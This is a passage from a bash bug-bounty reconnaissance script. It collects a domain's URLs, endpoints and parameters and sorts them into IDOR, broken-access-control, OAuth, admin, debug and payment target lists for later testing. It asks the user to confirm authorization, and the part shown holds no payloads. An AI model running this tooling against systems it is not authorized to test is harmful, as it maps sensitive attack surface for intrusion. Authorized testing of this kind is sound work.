    echo -e "${RED}╚══════════════════════════════════════════╝${NC}"
    echo -e "  Nuclei critical: ${RED}cat $WORKSPACE/vulns/nuclei/nuclei_critical_high.txt${NC}"
    echo -e "  XSS results    : ${RED}cat $WORKSPACE/vulns/xss/dalfox_results.txt${NC}"
    echo -e "  SQLi output    : ${RED}ls $WORKSPACE/vulns/sqli/${NC}"
}

# ══════════════════════════════════════════════════════════════
# -resume MODE — TRACK COMPLETED MODULES
# ══════════════════════════════════════════════════════════════
module_done() {
    echo "$1" >> "$WORKSPACE/.completed_modules"
}
module_completed() {
    [[ "$RESUME_MODE" == true ]] && grep -q "^$1$" "$WORKSPACE/.completed_modules" 2>/dev/null
}

# ══════════════════════════════════════════════════════════════
# -scope MODE — MULTI DOMAIN FROM FILE
# ══════════════════════════════════════════════════════════════
run_scope_mode() {
    section_header "-scope MODE — MULTI DOMAIN SCAN"
    if [[ ! -f "$SCOPE_FILE" ]]; then
        log ERROR "Scope file not found: $SCOPE_FILE"
        exit 1
    fi
    log INFO "Scanning $(wc -l < "$SCOPE_FILE") domains from $SCOPE_FILE"
    while IFS= read -r target; do
        [[ -z "$target" || "$target" == "#"* ]] && continue
        log STEP "Starting scan: $target"
        DOMAIN="$target"
        WORKSPACE="$HOME/bug-bounty/$target"
        mkdir -p "$WORKSPACE"/{subdomains,urls,js,paths,endpoints,params,vulns/{xss,sqli,ssrf,lfi,csrf,idor,nuclei,misconfig},screenshots,reports,logs}
        LOG_MASTER="$WORKSPACE/logs/master.log"
        touch "$LOG_MASTER"
        module_subdomains
        module_httpx
        module_urls
        module_js
        module_paths
        module_nuclei
        module_xss
        module_report
        log OK "Done: $target — report at $WORKSPACE/reports/report.html"
    done < "$SCOPE_FILE"
    log DONE "All targets complete!"
}

run_we_mode() {
    section_header "-we MODE — URL + ENDPOINT COLLECTION"
    local out="$WORKSPACE/urls"
    local ep="$WORKSPACE/endpoints"
    mkdir -p "$ep" "$WORKSPACE/js" "$WORKSPACE/params" "$out/gf"

    log STEP "STEP 1/3 — COLLECTING URLS FROM ALL SOURCES"
    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$out/wayback.txt"
    log OK "Wayback: $(wc -l < $out/wayback.txt) URLs"
    timeout 180 gau --subs --threads 10 --timeout 10 --blacklist png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css "$DOMAIN" 2>/dev/null | sort -u > "$out/gau.txt"
    log OK "gau: $(wc -l < $out/gau.txt 2>/dev/null || echo 0) URLs"
    timeout 180 waymore -i "$DOMAIN" -mode U -oU "$out/waymore.txt" 2>/dev/null || true
    log OK "waymore: $(wc -l < $out/waymore.txt 2>/dev/null || echo 0) URLs"
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$DOMAIN&size=10000" 2>/dev/null | jq -r ".results[]?.page?.url" 2>/dev/null | sort -u > "$out/urlscan.txt"
    log OK "urlscan.io: $(wc -l < $out/urlscan.txt 2>/dev/null || echo 0) URLs"
    echo "$DOMAIN" | httpx -silent -o "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null
    subfinder -d "$DOMAIN" -silent 2>/dev/null | httpx -silent -threads 50 -timeout 8 >> "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null
    sort -u -o "$WORKSPACE/subdomains/live_urls.txt" "$WORKSPACE/subdomains/live_urls.txt"
    timeout 300 katana -list "$WORKSPACE/subdomains/live_urls.txt" -jc -depth 3 -silent -timeout 10 -c 50 -o "$out/katana.txt" 2>/dev/null || true
    log OK "katana: $(wc -l < $out/katana.txt 2>/dev/null || echo 0) URLs"
    cat "$out"/wayback.txt "$out"/gau.txt "$out"/waymore.txt "$out"/urlscan.txt "$out"/katana.txt 2>/dev/null | sort -u > "$out/all_urls_raw.txt"
    cat "$out/all_urls_raw.txt" | uro 2>/dev/null > "$out/all_urls.txt" || cp "$out/all_urls_raw.txt" "$out/all_urls.txt"
    grep -E "\?[a-zA-Z0-9_]+=." "$out/all_urls.txt" | sort -u > "$out/urls_with_params.txt"
    log OK "Total URLs: $(wc -l < $out/all_urls.txt) | With params: $(wc -l < $out/urls_with_params.txt)"

    log STEP "STEP 2/3 — EXTRACTING ENDPOINTS"
    cat "$out/all_urls.txt" | grep -oP "https?://[^/]+\K(/[^?#\s]*)?" | sort -u | grep -v "^$" > "$ep/all_paths.txt"
    cat "$out/all_urls.txt" | grep -oP "https?://[^/]+\K(/[^\s]*)?" | sort -u | grep -v "^$" > "$ep/all_endpoints.txt"
    cat "$out/all_urls.txt" | grep -E "\.js(\?|$)" | sort -u > "$WORKSPACE/js/js_urls.txt"
    cat "$out/all_urls.txt" | grep -oP "[?&][a-zA-Z0-9_\-]+=" | sed "s/[?&]//;s/=//" | sort -u > "$WORKSPACE/params/all_params.txt"
    for pattern in xss sqli ssrf redirect lfi; do
        gf "$pattern" "$out/all_urls.txt" 2>/dev/null | sort -u > "$out/gf/${pattern}.txt"
        local cnt; cnt=$(wc -l < "$out/gf/${pattern}.txt" 2>/dev/null || echo 0)
        [[ $cnt -gt 0 ]] && log OK "gf [$pattern]: $cnt URLs"
    done
    grep -iE "(admin|api|v1|v2|v3|graphql|swagger|login|auth|dashboard|upload|reset|oauth|webhook|payment|config|secret|debug|backup|panel)" "$ep/all_endpoints.txt" 2>/dev/null | sort -u > "$ep/interesting_endpoints.txt"
    log OK "Paths: $(wc -l < $ep/all_paths.txt) | Endpoints: $(wc -l < $ep/all_endpoints.txt) | Interesting: $(wc -l < $ep/interesting_endpoints.txt)"

    log STEP "STEP 3/3 — COMPLETE"
    echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🐛 BUG FRAMEWORK -we — COMPLETE         ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC}  Target     : ${BOLD}$DOMAIN${NC}"
    echo -e "${RED}║${NC}  URLs       : ${RED}$(wc -l < $out/all_urls.txt)${NC}"
    echo -e "${RED}║${NC}  Paths      : ${RED}$(wc -l < $ep/all_paths.txt)${NC}"
    echo -e "${RED}║${NC}  Endpoints  : ${RED}$(wc -l < $ep/all_endpoints.txt)${NC}"
    echo -e "${RED}║${NC}  Params     : ${RED}$(wc -l < $WORKSPACE/params/all_params.txt)${NC}"
    echo -e "${RED}║${NC}  JS Files   : ${RED}$(wc -l < $WORKSPACE/js/js_urls.txt)${NC}"
    echo -e "${RED}║${NC}  Interesting: ${RED}$(wc -l < $ep/interesting_endpoints.txt)${NC}"
    echo -e "${RED}╚══════════════════════════════════════════╝${NC}"
    echo -e "  Interesting : ${RED}cat $ep/interesting_endpoints.txt${NC}"
    echo -e "  All paths   : ${RED}cat $ep/all_paths.txt${NC}"
    echo -e "  Params      : ${RED}cat $WORKSPACE/params/all_params.txt${NC}"
    echo -e "  XSS targets : ${RED}cat $out/gf/xss.txt${NC}"
    echo -e "  SQLi targets: ${RED}cat $out/gf/sqli.txt${NC}"
}

# ══════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ══════════════════════════════════════════════════════════════
main() {
    print_banner

    # Handle standalone flags
    if [[ "$UPDATE_NUCLEI" == true ]]; then
        log INFO "Updating nuclei templates..."
        nuclei -update-templates
        exit 0
    fi

    if [[ "$INSTALL_ONLY" == true ]]; then
        LOG_MASTER="/tmp/bug_install.log"
        touch "$LOG_MASTER"
        install_tools
        exit 0
    fi

    # Domain required
    if [[ -z "$DOMAIN" ]]; then
        show_help
    fi

    # Sanity check
    echo -e "${WARN} ${BOLD}${YELLOW}AUTHORIZED TESTING CONFIRMATION${NC}"
    echo -e "${DIM}Target: $DOMAIN${NC}"
    echo -e "${YELLOW}Do you have written authorization to test this target? [y/N]${NC} "
    read -r confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${CROSS} Aborting — only run on authorized targets."
        exit 1
    fi

    # Setup
    setup_workspace

    export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
    export GOPATH=$HOME/go

    # -scope mode — scan multiple domains from file
    if [[ -n "$SCOPE_FILE" ]]; then
        run_scope_mode
        exit 0
    fi

    if [[ "$WE_ONLY" == true ]]; then
        run_we_mode
        exit 0
    fi

    if [[ "$SUB_ONLY" == true ]]; then
        run_sub_mode
        exit 0
    fi

    if [[ "$JS_ONLY" == true ]]; then
        run_js_mode
        exit 0
    fi

    if [[ "$FUZZ_ONLY" == true ]]; then
        run_fuzz_mode
        exit 0
    fi

    if [[ "$VULN_ONLY" == true ]]; then
        run_vuln_mode
        exit 0
    fi

    if [[ "$REPORT_ONLY" == true ]]; then
        module_report
        exit 0
    fi

    if [[ "$DEEP_MODE" == true ]]; then
        log INFO "DEEP MODE — max aggression enabled"
        export FFUF_THREADS=200
        export NUCLEI_THREADS=100
        export KATANA_DEPTH=7
    fi

    if [[ "$ONE_ONLY" == true ]]; then
        export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
        export GOPATH=$HOME/go
        log INFO "Mode: -one (single domain — skipping subdomain enum)"
        echo "https://$DOMAIN" > "$WORKSPACE/subdomains/live_urls.txt"
        echo "$DOMAIN" >> "$WORKSPACE/subdomains/all_subdomains.txt"
        echo "$DOMAIN" >> "$WORKSPACE/subdomains/resolved_domains.txt"
    fi

    install_tools

    # Run all modules (resume-aware)
    module_completed "subdomains" || { module_subdomains; module_done "subdomains"; }
    module_completed "httpx"      || { module_httpx;      module_done "httpx"; }
    module_completed "urls"       || { module_urls;        module_done "urls"; }
    module_completed "js"         || { module_js;          module_done "js"; }
    module_completed "paths"      || { module_paths;       module_done "paths"; }
    module_completed "nuclei"     || { module_nuclei;      module_done "nuclei"; }
    module_completed "xss"        || { module_xss;         module_done "xss"; }
    module_completed "sqli"       || { module_sqli;        module_done "sqli"; }
    module_completed "ssrf"       || { module_ssrf;        module_done "ssrf"; }
    module_completed "lfi"        || { module_lfi;         module_done "lfi"; }
    module_completed "csrf"       || { module_csrf;        module_done "csrf"; }
    module_completed "idor"       || { module_idor_auth;   module_done "idor"; }
    module_report
    print_final_summary
}

main "$@"

# ══════════════════════════════════════════════════════════════
# MODULE 14 — SMART TARGET CLASSIFIER (IDOR / BAC / OAUTH)
# ══════════════════════════════════════════════════════════════
module_classify_targets() {
    show_progress "Smart Target Classification"
    section_header "MODULE 14 — SMART TARGET CLASSIFIER (IDOR / BAC / OAUTH)"

    local CLASSIFY_DIR="$WORKSPACE/classified"
    mkdir -p \
        "$CLASSIFY_DIR/idor" \
        "$CLASSIFY_DIR/bac" \
        "$CLASSIFY_DIR/oauth" \
        "$CLASSIFY_DIR/upload" \
        "$CLASSIFY_DIR/export" \
        "$CLASSIFY_DIR/payment" \
        "$CLASSIFY_DIR/webhook" \
        "$CLASSIFY_DIR/admin" \
        "$CLASSIFY_DIR/debug" \
        "$CLASSIFY_DIR/burp_imports"

    local MASTER="$CLASSIFY_DIR/master_input.txt"
    cat \
        "$WORKSPACE/urls/all_urls.txt" \
        "$WORKSPACE/urls/urls_with_params.txt" \
        "$WORKSPACE/endpoints/all_endpoints.txt" \
        "$WORKSPACE/endpoints/interesting_paths.txt" \
        "$WORKSPACE/js/all_js_endpoints.txt" \
        "$WORKSPACE/js/linkfinder_endpoints.txt" \
        "$WORKSPACE/subdomains/live_urls.txt" \
        2>/dev/null | sort -u > "$MASTER"

    local TOTAL
    TOTAL=$(wc -l < "$MASTER")
    log INFO "Classifying $TOTAL unique targets across all sources..."

    # ── IDOR ─────────────────────────────────────────────────
    grep -iE "(/[a-z_-]*/[0-9]{1,10}(/|$|\?)|[?&](id|user_id|account_id|order_id|invoice_id|ticket_id|item_id|record_id|doc_id|file_id|msg_id|thread_id|post_id|comment_id|product_id|customer_id|member_id|profile_id|object_id|entry_id|transaction_id|booking_id|reservation_id|patient_id|employee_id|client_id|project_id|task_id|case_id|claim_id|policy_id|ref_id|uid|oid|pid|rid|cid|sid)=[0-9]{1,10})" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/idor_numeric_id.txt"

    grep -iE "[?&/][a-z_-]*[=/?][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/idor_uuid.txt"

    grep -iP "/api/v?[0-9]?/?(users?|accounts?|orders?|invoices?|tickets?|documents?|files?|messages?|threads?|posts?|comments?|products?|customers?|members?|profiles?|records?|entries?|transactions?|bookings?|patients?|employees?|clients?|projects?|tasks?|cases?|claims?|policies?|objects?|items?|assets?)/[^/?\s]+" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/idor_api_object.txt"

    grep -iE "[?&](username|email|phone|mobile|account|owner|created_by|assigned_to|belongs_to|author|user|member|subscriber)=" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/idor_ownership_params.txt"

    grep -iE "/(download|view|preview|export|share|get|fetch|read|open|show|display|render)[/?][a-zA-Z0-9_-]*[=/?][a-zA-Z0-9_-]{4,}" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/idor_download_view.txt"

    grep -iE "[?&](token|hash|key|code|ref|share_token|download_token|view_token|nonce)=[a-zA-Z0-9+/=_-]{8,}" \
        "$MASTER" 2>/dev/null | grep -viE "(oauth|bearer|jwt|authorization)" | sort -u \
        > "$CLASSIFY_DIR/idor/idor_token_based.txt"

    cat "$CLASSIFY_DIR/idor/"*.txt 2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/IDOR_ALL.txt"
    cat "$CLASSIFY_DIR/idor/idor_numeric_id.txt" \
        "$CLASSIFY_DIR/idor/idor_api_object.txt" \
        "$CLASSIFY_DIR/idor/idor_uuid.txt" \
        2>/dev/null | sort -u > "$CLASSIFY_DIR/idor/IDOR_PRIORITY.txt"

    local N_IDOR N_IDOR_P
    N_IDOR=$(wc -l < "$CLASSIFY_DIR/idor/IDOR_ALL.txt")
    N_IDOR_P=$(wc -l < "$CLASSIFY_DIR/idor/IDOR_PRIORITY.txt")
    log OK "IDOR — Total: $N_IDOR | Priority: $N_IDOR_P"

    # ── BAC ──────────────────────────────────────────────────
    grep -iP "/(admin|administrator|superadmin|superuser|su|root|sysadmin|staff|moderator|manager|manage|management|supervisor|owner|internal|intranet|back-?office|backoffice|backstage|cms|control-?panel|controlpanel|cp|cpanel|dashboard|panel|console|control|hub)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_admin_paths.txt"

    grep -iP "/(role|roles|permission|permissions|privilege|privileges|acl|access-?control|policy|policies|grant|revoke|assign|assignment|entitlement|scope|capability|capabilities)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_role_permission.txt"

    grep -iP "/(users?|accounts?|members?|profiles?|customers?|employees?)/(list|all|search|bulk|create|add|new|invite|delete|remove|deactivate|activate|ban|block|update|edit|modify|change|reset|verify|approve|reject)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_user_management.txt"

    grep -iP "/(delete|remove|destroy|purge|wipe|drop|truncate|promote|demote|escalate|elevate|impersonate|sudo|switch-?user|bulk|mass|batch|all-users|export-users|dump|backup)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_sensitive_actions.txt"

    grep -iP "/api/v?[0-9]?/?(users?|accounts?|customers?|members?|employees?|orders?|transactions?|invoices?|records?|logs?|events?)(\?|$)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_api_list_all.txt"

    grep -iP "/(settings?|configuration|config|preferences|setup|install|system|env|environment|server-status|server-info|phpinfo|info\.php|status|health|metrics|actuator|monitor|diagnostic)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_config_settings.txt"

    grep -iP "/(create|update|edit|modify|delete|remove|add|set|put|post|patch|write|save|submit)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/bac_write_operations.txt"

    [[ -s "$WORKSPACE/vulns/idor/bac_findings.txt" ]] && \
        cp "$WORKSPACE/vulns/idor/bac_findings.txt" "$CLASSIFY_DIR/bac/bac_confirmed_unauthed.txt"

    cat "$CLASSIFY_DIR/bac/"*.txt 2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/BAC_ALL.txt"
    cat "$CLASSIFY_DIR/bac/bac_admin_paths.txt" \
        "$CLASSIFY_DIR/bac/bac_user_management.txt" \
        "$CLASSIFY_DIR/bac/bac_api_list_all.txt" \
        "$CLASSIFY_DIR/bac/bac_confirmed_unauthed.txt" \
        2>/dev/null | sort -u > "$CLASSIFY_DIR/bac/BAC_PRIORITY.txt"

    local N_BAC N_BAC_P
    N_BAC=$(wc -l < "$CLASSIFY_DIR/bac/BAC_ALL.txt")
    N_BAC_P=$(wc -l < "$CLASSIFY_DIR/bac/BAC_PRIORITY.txt")
    [[ -s "$CLASSIFY_DIR/bac/bac_confirmed_unauthed.txt" ]] && \
        log WARN "BAC confirmed unauthed 200: $(wc -l < "$CLASSIFY_DIR/bac/bac_confirmed_unauthed.txt") endpoints"
    log OK "BAC — Total: $N_BAC | Priority: $N_BAC_P"

    # ── OAUTH ────────────────────────────────────────────────
    grep -iE "/(oauth|oauth2|oidc|openid|connect|sso|saml|cas)(/|$|\?)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_endpoints.txt"

    grep -iE "/(authorize|authorise|auth/authorize|oauth/authorize|token|oauth/token|auth/token|access_token|refresh_token|callback|oauth/callback|auth/callback|redirect_uri|code|auth/code|grant|auth/grant)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_flow_endpoints.txt"

    grep -iE "[?&](client_id|client_secret|redirect_uri|response_type|grant_type|scope|state|nonce|code_challenge|code_verifier|id_token|access_token|refresh_token|token_type|expires_in)=" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_params.txt"

    grep -iE "/(login|signin|sign-in|auth|authenticate|authentication)(/|\?|$)" \
        "$MASTER" 2>/dev/null | \
        grep -iE "(google|facebook|github|twitter|microsoft|apple|linkedin|slack|discord|okta|auth0|cognito|keycloak|ping|adfs|azure|ldap)" \
        2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_social_login.txt"

    grep -iE "/(\.well-known|jwks|jwks\.json|openid-configuration|discovery|userinfo|introspect|revoke|device|par|pushed-authorization)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_discovery.txt"

    grep -iE "[?&#](access_token|id_token|token|jwt|bearer)=[a-zA-Z0-9._-]{20,}" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_token_in_url.txt"
    [[ -s "$CLASSIFY_DIR/oauth/oauth_token_in_url.txt" ]] && \
        log WARN "CRITICAL: Tokens exposed in URLs! → $CLASSIFY_DIR/oauth/oauth_token_in_url.txt"

    grep -iP "/(forgot|forgot-password|reset|reset-password|password-reset|magic-link|passwordless|one-time|otp|verify|confirm|activate|email-verification|account-verification)(/|\?|$)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_password_reset.txt"

    grep -iP "/(logout|signout|sign-out|session|sessions|revoke|invalidate|terminate|end-session|disconnect)(/|\?|$)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/oauth_session.txt"

    cat "$CLASSIFY_DIR/oauth/"*.txt 2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/OAUTH_ALL.txt"
    cat "$CLASSIFY_DIR/oauth/oauth_token_in_url.txt" \
        "$CLASSIFY_DIR/oauth/oauth_flow_endpoints.txt" \
        "$CLASSIFY_DIR/oauth/oauth_discovery.txt" \
        "$CLASSIFY_DIR/oauth/oauth_params.txt" \
        2>/dev/null | sort -u > "$CLASSIFY_DIR/oauth/OAUTH_PRIORITY.txt"

    local N_OAUTH N_OAUTH_P
    N_OAUTH=$(wc -l < "$CLASSIFY_DIR/oauth/OAUTH_ALL.txt")
    N_OAUTH_P=$(wc -l < "$CLASSIFY_DIR/oauth/OAUTH_PRIORITY.txt")
    log OK "OAuth — Total: $N_OAUTH | Priority: $N_OAUTH_P"

    # ── BONUS CATEGORIES ─────────────────────────────────────
    grep -iP "/(upload|uploads?|file-upload|image-upload|avatar|photo|attachment|attachments?|media|import|ingest|multipart|blob|document-upload)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/upload/UPLOAD_ALL.txt"

    grep -iP "/(export|exports?|download|report|reports?|csv|excel|pdf|dump|backup|extract|generate|snapshot|archive)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/export/EXPORT_ALL.txt"

    grep -iP "/(pay|payment|payments?|checkout|charge|invoice|invoices?|billing|subscription|subscriptions?|stripe|paypal|braintree|card|credit|debit|bank|refund|coupon|discount|promo|price|pricing)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/payment/PAYMENT_ALL.txt"

    grep -iP "/(webhook|webhooks?|hook|hooks?|notify|notification|notifications?|event|events?|callback|callbacks?|integration|integrations?)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/webhook/WEBHOOK_ALL.txt"

    grep -iP "/(debug|dev|develop|development|test|testing|qa|staging|phpinfo|info\.php|server-status|server-info|\.env|\.git|\.svn|actuator|metrics|prometheus|grafana|kibana|elastic|swagger|api-docs|redoc|openapi|graphiql|voyager|playground)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/debug/DEBUG_ALL.txt"

    grep -iP "/(wp-admin|wp-login|joomla|drupal|typo3|magento|prestashop|phpmyadmin|pma|adminer|cpanel|whm|plesk|directadmin|webmin|laravel|telescope|horizon|nova|filament|orchid)" \
        "$MASTER" 2>/dev/null | sort -u > "$CLASSIFY_DIR/admin/ADMIN_CMS_ALL.txt"

    log OK "Bonus — Upload:$(wc -l < "$CLASSIFY_DIR/upload/UPLOAD_ALL.txt" 2>/dev/null||echo 0) Export:$(wc -l < "$CLASSIFY_DIR/export/EXPORT_ALL.txt" 2>/dev/null||echo 0) Payment:$(wc -l < "$CLASSIFY_DIR/payment/PAYMENT_ALL.txt" 2>/dev/null||echo 0) Webhook:$(wc -l < "$CLASSIFY_DIR/webhook/WEBHOOK_ALL.txt" 2>/dev/null||echo 0) Debug:$(wc -l < "$CLASSIFY_DIR/debug/DEBUG_ALL.txt" 2>/dev/null||echo 0)"

    # ── BURP IMPORTS ─────────────────────────────────────────
    for category in "idor/IDOR_PRIORITY" "bac/BAC_PRIORITY" "oauth/OAUTH_PRIORITY"; do
        local fname src
        fname=$(basename "$category")
        src="$CLASSIFY_DIR/${category}.txt"
        if [[ -s "$src" ]]; then
            cp "$src" "$CLASSIFY_DIR/burp_imports/${fname}_urls.txt"
            grep -oP "https?://[^/?#]+" "$src" 2>/dev/null | sort -u \
                > "$CLASSIFY_DIR/burp_imports/${fname}_hosts.txt"
            grep -oP "https?://[^/?#]+\K(/[^?\s]*)" "$src" 2>/dev/null | sort -u \
                > "$CLASSIFY_DIR/burp_imports/${fname}_paths.txt"
        fi
    done
    log OK "Burp imports ready: $CLASSIFY_DIR/burp_imports/"

    # ── SUMMARY ──────────────────────────────────────────────
    echo ""
    echo -e "${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${MAGENTA}║      🎯 MODULE 14 — CLASSIFICATION COMPLETE                  ║${NC}"
    echo -e "${BOLD}${MAGENTA}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${MAGENTA}║${NC}  Input targets   : ${BOLD}$TOTAL${NC}"
    echo -e "${MAGENTA}║${NC}"
    echo -e "${MAGENTA}║${NC}  ${RED}IDOR${NC}  Total: ${BOLD}$N_IDOR${NC}  │  Priority: ${BOLD}${RED}$N_IDOR_P${NC}"
    echo -e "${MAGENTA}║${NC}     ├─ Numeric IDs   : $(wc -l < "$CLASSIFY_DIR/idor/idor_numeric_id.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ UUIDs         : $(wc -l < "$CLASSIFY_DIR/idor/idor_uuid.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ API Objects   : $(wc -l < "$CLASSIFY_DIR/idor/idor_api_object.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Ownership     : $(wc -l < "$CLASSIFY_DIR/idor/idor_ownership_params.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     └─ Download/View : $(wc -l < "$CLASSIFY_DIR/idor/idor_download_view.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}"
    echo -e "${MAGENTA}║${NC}  ${YELLOW}BAC${NC}   Total: ${BOLD}$N_BAC${NC}  │  Priority: ${BOLD}${YELLOW}$N_BAC_P${NC}"
    echo -e "${MAGENTA}║${NC}     ├─ Admin paths   : $(wc -l < "$CLASSIFY_DIR/bac/bac_admin_paths.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ User mgmt     : $(wc -l < "$CLASSIFY_DIR/bac/bac_user_management.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ API list-all  : $(wc -l < "$CLASSIFY_DIR/bac/bac_api_list_all.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Role/Perms    : $(wc -l < "$CLASSIFY_DIR/bac/bac_role_permission.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     └─ Confirmed 200 : $(wc -l < "$CLASSIFY_DIR/bac/bac_confirmed_unauthed.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}"
    echo -e "${MAGENTA}║${NC}  ${CYAN}OAUTH${NC} Total: ${BOLD}$N_OAUTH${NC}  │  Priority: ${BOLD}${CYAN}$N_OAUTH_P${NC}"
    echo -e "${MAGENTA}║${NC}     ├─ Flow URLs     : $(wc -l < "$CLASSIFY_DIR/oauth/oauth_flow_endpoints.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ OAuth Params  : $(wc -l < "$CLASSIFY_DIR/oauth/oauth_params.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Discovery     : $(wc -l < "$CLASSIFY_DIR/oauth/oauth_discovery.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     └─ Token in URL  : $(wc -l < "$CLASSIFY_DIR/oauth/oauth_token_in_url.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}"
    echo -e "${MAGENTA}║${NC}  ${GREEN}BONUS${NC}"
    echo -e "${MAGENTA}║${NC}     ├─ Upload        : $(wc -l < "$CLASSIFY_DIR/upload/UPLOAD_ALL.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Export/Dump   : $(wc -l < "$CLASSIFY_DIR/export/EXPORT_ALL.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Payment       : $(wc -l < "$CLASSIFY_DIR/payment/PAYMENT_ALL.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Webhooks      : $(wc -l < "$CLASSIFY_DIR/webhook/WEBHOOK_ALL.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     ├─ Debug/Dev     : $(wc -l < "$CLASSIFY_DIR/debug/DEBUG_ALL.txt" 2>/dev/null||echo 0)"
    echo -e "${MAGENTA}║${NC}     └─ CMS/Admin     : $(wc -l < "$CLASSIFY_DIR/admin/ADMIN_CMS_ALL.txt" 2>/dev/null||echo 0)"
    echo -e "${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}📁 Output: $CLASSIFY_DIR${NC}"
    echo -e "  ${RED}IDOR Priority  :${NC} cat $CLASSIFY_DIR/idor/IDOR_PRIORITY.txt"
    echo -e "  ${YELLOW}BAC Priority   :${NC} cat $CLASSIFY_DIR/bac/BAC_PRIORITY.txt"
    echo -e "  ${CYAN}OAuth Priority :${NC} cat $CLASSIFY_DIR/oauth/OAUTH_PRIORITY.txt"
    echo -e "  ${GREEN}Burp Imports   :${NC} ls $CLASSIFY_DIR/burp_imports/"
    echo ""

    echo "CLASSIFY_IDOR=$N_IDOR"   >> "$WORKSPACE/scan_config.txt"
    echo "CLASSIFY_BAC=$N_BAC"     >> "$WORKSPACE/scan_config.txt"
    echo "CLASSIFY_OAUTH=$N_OAUTH" >> "$WORKSPACE/scan_config.txt"
}
